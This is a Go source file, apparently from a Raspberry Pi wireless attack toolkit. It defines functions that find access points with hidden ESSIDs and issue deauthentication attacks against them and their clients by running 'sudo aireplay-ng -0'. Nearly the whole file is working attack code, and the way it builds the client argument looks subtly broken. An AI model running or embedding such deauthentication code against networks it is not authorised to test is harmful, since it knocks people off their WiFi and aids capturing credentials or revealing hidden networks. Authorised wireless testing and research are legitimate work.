package modules

import (
	"os/exec"

	"github.com/5N41P4/raspberry/internal/data"
)

func (i *Interface) DeauthAll(aps *map[string]*data.AppAP, clients *map[string]*data.AppClient) {
	i.DeauthActive = true
	for _, ap := range *aps {
		if ap.Essid == "" {
			for _, cli := range *clients {
				if cli.Bssid == ap.Bssid {
					i.deauth(ap.Bssid, cli.Station)
					break
				}
			}
			i.deauth(ap.Bssid, "")
		}
	}
	i.DeauthActive = false
}

func (i *Interface) deauth(bssid string, station string) {
	var cmdStation string
	if station == "" {
		cmdStation = ""
	} else {
		cmdStation = "-c " + station
	}
	proc := exec.Command("sudo", "aireplay-ng", "-0", "5", "-a", bssid, cmdStation, i.Name)
	_ = proc.Run()
}
